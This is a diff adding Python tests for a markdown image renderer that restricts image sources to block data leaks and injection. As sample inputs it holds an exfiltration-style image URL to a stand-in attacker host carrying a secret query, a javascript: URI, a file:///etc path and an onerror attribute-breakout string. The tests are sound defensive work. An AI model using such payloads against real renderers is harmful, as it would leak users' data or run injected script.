@@ -514,3 +514,42 @@ class TestObsSummaryAbsorbedRequest:
 
     def test_failed_path_is_untouched(self):
         assert self._sum("Observation: boom", failed=True) == "boom"
+
+
+class TestImages:
+    """``![alt](src)`` (v10.64.0) — 그림은 그려지는 순간 요청을 내므로 출처를 좁힌다:
+    작업 폴더 경로와 래스터 ``data:`` 만 ``<img>``, 외부 URL 은 링크, 나머지는 글."""
+
+    PNG = "data:image/png;base64,iVBORw0KGgo="
+
+    def test_workspace_path_goes_through_the_image_endpoint(self):
+        out = _format("see ![chart](out/a&b.png)")
+        assert 'src="api/workspace/file?path=out%2Fa%26b.png"' in out
+        assert 'alt="chart"' in out and 'target="_blank"' in out
+
+    def test_raster_data_uri_is_inlined(self):
+        out = _format(f"![dot]({self.PNG})")
+        assert f'<img class="md-img" src="{self.PNG}" alt="dot">' in out
+
+    def test_svg_data_uri_stays_text(self):
+        out = _format("![x](data:image/svg+xml;base64,PHN2Zz4=)")
+        assert "<img" not in out and "![x](data:image/svg+xml" in out
+
+    def test_external_url_is_a_link_not_an_image(self):
+        out = _format("![leak](https://evil.example/p.png?d=secret)")
+        assert "<img" not in out
+        assert 'href="https://evil.example/p.png?d=secret"' in out
+        assert 'rel="noopener noreferrer"' in out and "🖼 leak" in out
+
+    def test_other_schemes_and_protocol_relative_stay_text(self):
+        for src in ("javascript:alert(1)", "//evil.example/x.png", "file:///etc/x.png"):
+            out = _format(f"![x]({src})")
+            assert "<img" not in out and "<a" not in out, src
+
+    def test_quotes_cannot_break_out_of_the_attribute(self):
+        out = _format('![a" onerror="x](p.png)')
+        assert 'onerror="x"' not in out and "&quot;" in out
+
+    def test_inline_code_and_fences_are_left_alone(self):
+        assert "<img" not in _format("`![x](p.png)`")
+        assert "<img" not in _format("```\n![x](p.png)\n```")
